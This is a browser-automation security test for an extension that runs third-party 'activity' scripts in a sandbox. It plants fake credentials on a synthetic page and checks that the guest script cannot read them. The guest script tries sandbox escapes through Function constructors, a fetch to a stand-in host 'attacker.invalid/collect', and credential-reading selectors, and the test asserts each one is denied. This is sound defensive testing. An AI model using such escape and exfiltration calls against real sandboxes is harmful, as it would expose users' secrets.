// Optional real-browser security smoke test. Uses a disposable profile and
// synthetic HTTPS responses; it never opens an existing browser profile.
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const bundledModules = 'C:/Users/Jonathan/.cache/codex-runtimes/codex-primary-runtime/dependencies/node/node_modules';
let playwright;
try {
  const require = process.env.CHUDPRESENCE_TEST_NODE_MODULES
    ? createRequire(path.join(path.resolve(process.env.CHUDPRESENCE_TEST_NODE_MODULES), 'package.json'))
    : createRequire(import.meta.url);
  playwright = require('playwright');
} catch {
  try { playwright = createRequire(path.join(bundledModules, 'package.json'))('playwright'); }
  catch { throw new Error('Install Playwright or set CHUDPRESENCE_TEST_NODE_MODULES to its node_modules directory.'); }
}

const fixtureOrigin = 'https://www.youtube.com'; // Already granted by the lab manifest.
const fixturePath = '/chudpresence-v2-browser-fixture';
const id = 'browser-v2-smoke';
const sentinel = 'v2-browser-fixture-extension-private';
const fixture = `<!doctype html><html><head><title>V2 public fixture</title>
  <meta name="csrf-token" content="fixture-meta-secret">
  <style>.concealed { display: none; }</style></head><body>
  <h1 id="public-title">Public episode</h1>
  <section id="public-region">Public description
    <span hidden>fixture-hidden-secret</span>
    <span class="concealed">fixture-css-secret</span>
    <form id="login-form">fixture-form-secret
      <input id="password" type="password" value="fixture-password-secret" title="fixture-password-secret">
    </form>
    <div contenteditable="true">fixture-editable-secret</div>
    <script>window.fixturePrivate = 'fixture-script-secret';</script>
  </section>
  <a id="public-link" href="https://example.com/watch?access_token=fixture-url-secret#fixture-fragment-secret">Watch</a>
  <site-shell></site-shell>
  <section id="media-card"><video width="640" height="360"></video>
    <h2 id="media-title">Scoped public title</h2>
    <a id="media-link" href="https://example.com/reel/123?token=fixture-media-secret#private">Scoped link</a>
  </section>
  <script id="site-state" type="application/json">{"catalog":{"title":"Public JSON title","authorization":"fixture-json-secret","nested":{"sessionToken":"fixture-json-session-secret","episode":4}}}</script>
  <script>
    document.cookie = 'fixtureSession=fixture-cookie-secret; Secure; SameSite=Lax';
    localStorage.setItem('fixtureSession', 'fixture-storage-secret');
    document.querySelector('site-shell').attachShadow({mode:'open'}).innerHTML = '<div class="episode-title">Shadow episode</div>';
    // Native state crosses isolated worlds; page-world property overrides do not.
    const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 360;
    canvas.getContext('2d').fillRect(0, 0, 640, 360);
    const video = document.querySelector('video');
    video.muted = true; video.srcObject = canvas.captureStream(1); video.play();
  </script></body></html>`;
const pageAccess = {
  url: true,
  media: true,
  mediaScopes: { card: { container: '#media-card', ancestors: 4, selectors: {
    title: { selector: '#media-title', read: 'text' },
    link: { selector: '#media-link', read: 'attribute', attribute: 'href' },
  } } },
  selectors: {
    title: { selector: '#public-title', read: 'text' },
    summary: { selector: '#public-region', read: 'text' },
    shadow: { selector: 'site-shell >>> .episode-title', read: 'text' },
    form: { selector: '#login-form', read: 'text' },
    control: { selector: '#password', read: 'attribute', attribute: 'title' },
    link: { selector: '#public-link', read: 'attribute', attribute: 'href' },
    catalog: { selector: '#site-state', read: 'json', path: ['catalog'] },
  },
};
const source = `
  let recorded = false;
  ChudPresence.onUpdate(async snapshot => {
    if (recorded) return;
    if (!ChudPresence.media.getAll()[0]?.scopes?.card) return;
    recorded = true;
    const absent = [typeof document, typeof window, typeof chrome, typeof browser,
      typeof fetch, typeof XMLHttpRequest, typeof WebSocket, typeof localStorage,
      typeof navigator, typeof __activityV2Bridge,
      ChudPresence.report.constructor('return typeof document')(),
      ({}).constructor.constructor('return typeof chrome')()];
    let deniedNetwork = false;
    try { await ChudPresence.net.fetch('https://attacker.invalid/collect'); }
    catch { deniedNetwork = true; }
    const foreignStorage = await ChudPresence.storage.get('discordAuthSentinel');
    await ChudPresence.storage.set('probe', {
      absent, deniedNetwork, foreignStorage,
      title: ChudPresence.page.read('title'),
      summary: ChudPresence.page.read('summary'),
      shadow: ChudPresence.page.read('shadow'),
      form: ChudPresence.page.read('form'),
      control: ChudPresence.page.read('control'),
      link: ChudPresence.page.read('link'),
      catalog: ChudPresence.page.read('catalog'),
      info: ChudPresence.page.info(),
      media: ChudPresence.media.getAll(),
      frozen: Object.isFrozen(snapshot) && Object.isFrozen(snapshot.reads) && Object.isFrozen(snapshot.media[0].scopes.card.reads)
    });
    await ChudPresence.report({kind:'video',media:{title:ChudPresence.page.read('title')},playback:{state:'playing'}});
  });
`;

function activityPackage(activityId, activitySource, access = pageAccess) {
  return {
    metadata: {
      id: activityId, name: 'V2 browser security fixture',
      description: 'Synthetic browser fixture for the sandbox boundary.',
      version: '1.0.0', apiVersion: 2, entry: 'activity.js',
      matches: [`${fixtureOrigin}${fixturePath}*`], pageAccess: access,
    },
    source: activitySource,
  };
}

async function removeProfile(profile) {
  const resolved = path.resolve(profile);
  const relative = path.relative(path.resolve(os.tmpdir()), resolved);
  assert.ok(relative && !relative.startsWith('..') && !path.isAbsolute(relative)
    && path.basename(resolved).startsWith('chudpresence-v2-browser-'), 'Unexpected browser profile path');
  await fs.rm(resolved, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
}

async function launch() {
  const candidates = process.env.CHUDPRESENCE_TEST_BROWSER
    ? [process.env.CHUDPRESENCE_TEST_BROWSER]
    : [playwright.chromium.executablePath(), ...(process.platform === 'win32'
      ? ['C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe'] : [])];
  const failures = [];
  for (const executablePath of [...new Set(candidates)]) {
    const profile = await fs.mkdtemp(path.join(os.tmpdir(), 'chudpresence-v2-browser-'));
    try {
      const context = await playwright.chromium.launchPersistentContext(profile, {
        executablePath,
        headless: true,
        ignoreDefaultArgs: ['--disable-extensions'],
        args: [
          `--disable-extensions-except=${path.join(root, 'extension')}`,
          `--load-extension=${path.join(root, 'extension')}`,
        ],
      });
      return { context, profile, executablePath };
    } catch (error) {
      failures.push(`${executablePath}: ${String(error.message).split('\n')[0]}`);
      await removeProfile(profile);
    }
  }
  throw new Error(`No test browser could launch. Set CHUDPRESENCE_TEST_BROWSER to a Chromium executable.\n${failures.join('\n')}`);
}

async function until(operation, predicate, message, timeout = 15_000) {
  const deadline = Date.now() + timeout;
  let value;
  do {
    value = await operation();
    if (predicate(value)) return value;
    await new Promise(resolve => setTimeout(resolve, 100));
  } while (Date.now() < deadline);
  throw new Error(`${message}: ${JSON.stringify(value)}`);
}

const { context, profile, executablePath } = await launch();
let navigationGate = null;
let closingNavigationTest = false;
try {
  const unexpectedRequests = [];
  await context.route(/^https?:\/\//, async route => {
    const url = new URL(route.request().url());
    if (url.origin === fixtureOrigin && url.pathname === fixturePath) {
      if (url.searchParams.get('hold') === '1' && navigationGate) {
        navigationGate.entered = true;
        await navigationGate.ready;
      }
      await route.fulfill({
        status: 200, contentType: 'text/html', body: fixture,
        headers: { 'Content-Security-Policy': "default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'unsafe-inline'; media-src 'none'; object-src 'none'" },
      }).catch(error => { if (!closingNavigationTest) throw error; });
    } else {
      unexpectedRequests.push(url.origin + url.pathname);
      await route.abort();
    }
  });
  const worker = context.serviceWorkers().find(item => item.url().endsWith('/background.js'))
    || await context.waitForEvent('serviceworker', { timeout: 15_000 });
  const extensionId = new URL(worker.url()).host;
  const preferences = await context.newPage();
  await preferences.goto(`chrome://extensions/?id=${extensionId}`);
  await preferences.evaluate(async extensionId => {
    if (typeof chrome.developerPrivate?.updateExtensionConfiguration !== 'function') {
      throw new Error('Cannot enable userScripts in the disposable profile on this browser.');
    }
    await chrome.developerPrivate.updateExtensionConfiguration({ extensionId, userScriptsAccess: true });
  }, extensionId);
  await worker.evaluate(async () => {
    if (typeof chrome.userScripts?.execute !== 'function') {
      throw new Error('The test browser does not expose userScripts.execute after granting access.');
    }
    await chrome.storage.local.set({ discordAuthSentinel: 'v2-browser-fixture-extension-private', enabled: false });
    await chrome.userScripts.getScripts();
  });
  await preferences.close();
  const controls = await context.newPage();
  await controls.goto(`chrome-extension://${extensionId}/activities.html`);
  const send = message => controls.evaluate(message => chrome.runtime.sendMessage(message), message);
  const install = async pkg => {
    const response = await send({ type: 'ACTIVITY_INSTALL', activityPackage: pkg });
    assert.equal(response?.ok, true, response?.error || 'Activity installation failed');
  };
  await install(activityPackage(id, source));
  const scripts = await worker.evaluate(() => chrome.userScripts.getScripts());
  const registration = scripts.find(script => script.id === 'chudpresence-activity-browser-v2-smoke');
  assert.equal(registration?.js?.[0]?.file, 'core/activity-v2-page.generated.js');
  assert.equal(registration.worldId, `chudpresence.activity.v2.${id}`);
  const configurations = await worker.evaluate(() => chrome.userScripts.getWorldConfigurations());
  const world = configurations.find(item => item.worldId === `chudpresence.activity.v2.${id}`);
  assert.match(world?.csp || '', /connect-src 'none'/);
  assert.doesNotMatch(world?.csp || '', /'unsafe-eval'|'wasm-unsafe-eval'/);
  const page = await context.newPage();
  const browserErrors = [];
  page.on('pageerror', error => browserErrors.push(error.message));
  await page.goto(`${fixtureOrigin}${fixturePath}?access_token=fixture-navigation-secret#fixture-navigation-fragment`);
  assert.match(await page.evaluate(() => document.cookie), /fixture-cookie-secret/);
  assert.equal(await page.evaluate(() => localStorage.getItem('fixtureSession')), 'fixture-storage-secret');
  const storageKey = `chudpresence.activityStorage:${id}:probe`;
  const probe = await until(
    async () => {
      const value = await worker.evaluate(async key => (await chrome.storage.local.get(key))[key], storageKey);
      if (value) return value;
      const state = await send({ type: 'ACTIVITY_LIBRARY_STATE' });
      return { pending: true, diagnostics: state?.result?.installed?.find(item => item.id === id), browserErrors };
    },
    value => value && !value.pending, 'V2 did not produce its browser snapshot',
  );
  assert.deepEqual(probe.absent, Array(12).fill('undefined'));
  assert.equal(probe.deniedNetwork, true);
  assert.equal(probe.foreignStorage, null);
  assert.equal(probe.title, 'Public episode');
  assert.equal(probe.summary, 'Public description');
  assert.equal(probe.shadow, 'Shadow episode');
  assert.equal(probe.form, null);
  assert.equal(probe.control, null);
  assert.equal(probe.link, 'https://example.com/watch');
  assert.deepEqual(probe.catalog, { title: 'Public JSON title', nested: { episode: 4 } });
  assert.deepEqual(probe.info, { visibilityState: 'visible', origin: fixtureOrigin, pathname: fixturePath });
  assert.equal(probe.media.length, 1);
  assert.equal(typeof probe.media[0].currentTime, 'number');
  assert.deepEqual(probe.media[0].scopes.card, { reads: { title: 'Scoped public title', link: 'https://example.com/reel/123' }, rejected: [] });
  assert.equal(probe.frozen, true);
  assert.doesNotMatch(JSON.stringify(probe), /fixture-[a-z-]*secret|fixture-navigation-fragment|v2-browser-fixture-extension-private/);
  const status = await until(
    () => send({ type: 'ACTIVITY_LIBRARY_STATE' }),
    response => response?.result?.installed?.some(item => item.id === id && item.normalizedReport?.media?.title === 'Public episode'),
    'The real background manager did not accept the V2 presence report',
  );
  assert.equal(status.result.installed.find(item => item.id === id).status, 'detected');
  assert.equal((await worker.evaluate(() => chrome.storage.local.get('discordAuthSentinel'))).discordAuthSentinel, sentinel);
  const capability = await worker.evaluate(async id => (await chrome.storage.local.get('installedActivities')).installedActivities[id].capability, id);
  assert.ok(!JSON.stringify(probe).includes(capability), 'The guest received its private broker identity');
  const offscreen = await worker.evaluate(() => chrome.runtime.getContexts({ contextTypes: ['OFFSCREEN_DOCUMENT'] }));
  assert.equal(offscreen.length, 1, 'The sandbox did not use the shared offscreen host');
  const targets = await context.browser().newBrowserCDPSession();
  await targets.send('Target.setDiscoverTargets', { discover: true, filter: [{}] });
  // Chromium may omit an unattached dedicated worker's URL. This fresh profile
  // and fixture create workers only through the extension's sandbox host.
  const sandboxWorkers = async () => {
    const all = (await targets.send('Target.getTargets')).targetInfos;
    const workers = all.filter(target => target.type === 'worker' && (!target.url || /activity-v2-worker\.js$/.test(target.url)));
    // Edge can retain an empty, zero-process target after its offscreen parent
    // has closed. Count it until BOTH the parent target and the extension's
    // offscreen context are gone; a live host or worker must still fail cleanup.
    const parentIds = new Set(all.map(target => target.targetId));
    const orphaned = target => target.pid === 0 && target.url === '' &&
      target.parentId && !parentIds.has(target.parentId);
    if (!workers.some(orphaned)) return workers;
    const hosts = await worker.evaluate(() => chrome.runtime.getContexts({ contextTypes: ['OFFSCREEN_DOCUMENT'] }));
    return hosts.length ? workers : workers.filter(target => !orphaned(target));
  };
  const originalWorkers = await until(sandboxWorkers, items => items.length === 1,
    'The activity did not start its dedicated extension worker');
  const reload = await send({ type: 'ACTIVITY_RELOAD', id });
  assert.equal(reload.ok, true, reload.error || 'Activity reload failed');
  await until(sandboxWorkers, items => items.length === 1 && items[0].targetId !== originalWorkers[0].targetId,
    'Reload did not replace the activity worker');

  for (const selector of ['input[value^="x"]', 'div:has(meta[content^="x"])', '[data-token]', '[\\76 alue]']) {
    const response = await send({
      type: 'ACTIVITY_INSTALL',
      activityPackage: activityPackage('browser-v2-rejected', 'void 0;', {
        selectors: { denied: { selector, read: 'text' } },
      }),
    });
    assert.equal(response?.ok, false, `Credential selector was accepted: ${selector}`);
  }
  const budgetId = 'browser-v2-budget';
  const budgetStarts = () => worker.evaluate(async key => (await chrome.storage.local.get(key))[key],
    `chudpresence.activityStorage:${budgetId}:starts`);
  await install(activityPackage(budgetId, `(async () => {
    const starts = await ChudPresence.storage.get('starts');
    await ChudPresence.storage.set('starts', (starts || 0) + 1);
    while (true) {}
  })();`, {}));
  await until(
    () => send({ type: 'ACTIVITY_LIBRARY_STATE' }),
    response => response?.result?.installed?.find(item => item.id === 'browser-v2-budget')?.activityLogs
      ?.some(entry => /execution|resource|deadline|budget/.test(JSON.stringify(entry))),
    'The infinite-loop activity was not interrupted',
  );
  assert.equal(await page.evaluate(() => 6 * 7), 42, 'The page stopped responding after the attack');
  await until(sandboxWorkers, items => items.length === 1, 'The failed activity retained its worker');
  await new Promise(resolve => setTimeout(resolve, 2500));
  assert.equal(await budgetStarts(), 1, 'The failed activity restarted on the next broker poll');
  assert.equal((await sandboxWorkers()).length, 1, 'The failed activity respawned its worker');
  const reloadBudget = await send({ type: 'ACTIVITY_RELOAD', id: budgetId });
  assert.equal(reloadBudget.ok, true, reloadBudget.error || 'Failed activity could not be explicitly reloaded');
  await until(budgetStarts, count => count === 2, 'Explicit reload did not restart the failed activity');
  await until(sandboxWorkers, items => items.length === 1, 'The reloaded attack worker was not terminated');
  await new Promise(resolve => setTimeout(resolve, 2500));
  assert.equal(await budgetStarts(), 2, 'The explicitly reloaded activity kept restarting after failure');
  const disableBudget = await send({ type: 'ACTIVITY_SET_ENABLED', id: budgetId, enabled: false });
  assert.equal(disableBudget.ok, true, disableBudget.error || 'Attack fixture cleanup failed');
  const disable = await send({ type: 'ACTIVITY_SET_ENABLED', id, enabled: false });
  assert.equal(disable.ok, true, disable.error || 'Activity disable failed');
  await until(sandboxWorkers, items => items.length === 0, 'Disabled activities retained sandbox workers');

  const navigationId = 'browser-v2-navigation';
  const navigationPackage = activityPackage(navigationId, `ChudPresence.onUpdate(async () => {
    const title = ChudPresence.page.info().query.q;
    if (!title) { await ChudPresence.clear(); return; }
    await ChudPresence.report({kind:'generic',media:{title},display:{details:title},playback:{elapsed:true}});
  });`, { url: true, queryParameters: ['q'] });
  navigationPackage.metadata.presence = { navigationGraceMs: 4000 };
  await install(navigationPackage);
  assert.equal((await send({ type: 'SET_ENABLED', enabled: true })).ok, true);
  await page.goto(`${fixtureOrigin}${fixturePath}?q=first`);
  const state = () => send({ type: 'ACTIVITY_LIBRARY_STATE' });
  await until(state, response => response?.result?.finalPresenceIntent?.details === 'first',
    'Navigation fixture did not publish the first query');
  async function holdNavigation(query, submit = false) {
    let release;
    navigationGate = { entered: false, ready: new Promise(resolve => { release = resolve; }) };
    navigationGate.release = release;
    const destination = `${fixtureOrigin}${fixturePath}?q=${query}&hold=1`;
    await page.evaluate(({ url, submit }) => {
      if (submit) {
        const form = document.createElement('form');
        const destination = new URL(url);
        form.action = destination.origin + destination.pathname;
        for (const [name, value] of destination.searchParams) {
          const input = document.createElement('input');
          input.type = 'hidden'; input.name = name; input.value = value;
          form.append(input);
        }
        const button = document.createElement('button');
        button.id = 'navigation-test-link'; button.textContent = 'Submit search';
        form.append(button);
        document.body.append(form);
      } else {
        const link = document.createElement('a');
        link.id = 'navigation-test-link'; link.href = url; link.textContent = 'Next search mode';
        document.body.append(link);
      }
    }, { url: destination, submit });
    const navigating = page.waitForURL(destination)
      .then(() => ({ ok: true }), error => ({ error }));
    await page.locator('#navigation-test-link').click({ noWaitAfter: true });
    await until(async () => navigationGate.entered, Boolean, 'The fixture navigation was not requested', 2000);
    const held = await until(state, response => response?.result?.installed?.find(item => item.id === navigationId)?.activeFrames.length === 0,
      'The outgoing document was not retired', 2000);
    return { held, navigating, release };
  }
  let transition = await holdNavigation('second');
  assert.equal(transition.held.result.finalPresenceIntent?.details, 'first', `Document navigation cleared the held presence: ${JSON.stringify(transition.held.result.installed.find(item => item.id === navigationId))}`);
  transition.release();
  assert.equal((await transition.navigating).ok, true);
  await until(state, response => response?.result?.finalPresenceIntent?.details === 'second',
    'The replacement query did not replace held presence');
  transition = await holdNavigation('third', true);
  assert.equal(transition.held.result.finalPresenceIntent?.details, 'second');
  closingNavigationTest = true;
  const closeStarted = Date.now();
  await page.close();
  transition.release();
  await transition.navigating;
  await until(state, response => response?.result?.finalPresenceIntent === null,
    'Closing a tab during navigation grace did not clear immediately', 1500);
  assert.ok(Date.now() - closeStarted < 2000, 'Tab close waited for the navigation grace');
  try {
    await until(sandboxWorkers, items => items.length === 0, 'Closed navigation fixture retained workers', 3000);
  } catch (error) {
    const diagnostic = await state();
    const tabs = await worker.evaluate(() => chrome.tabs.query({ url: 'https://www.youtube.com/*' }));
    throw new Error(`${error.message}; ${JSON.stringify({ activity: diagnostic.result.installed.find(item => item.id === navigationId), tabs })}`);
  }
  await targets.detach();
  assert.ok(!unexpectedRequests.some(url => url.includes('attacker.invalid')), 'The network broker reached the undeclared destination');
  assert.deepEqual(browserErrors, []);
  console.log(`V2 browser security smoke passed (${path.basename(executablePath)}, ${await context.browser().version()}).`);
  console.log('Verified real USER_SCRIPT broker injection on a strict-CSP page, isolated offscreen workers, public DOM/shadow/JSON/media reads, credential isolation, scoped storage, denied network and selectors, presence reporting, CPU interruption, failure tombstones, explicit reload, disable cleanup, navigation grace, and immediate tab-close clearing during grace.');
} finally {
  navigationGate?.release?.();
  await context.close();
  await removeProfile(profile);
}
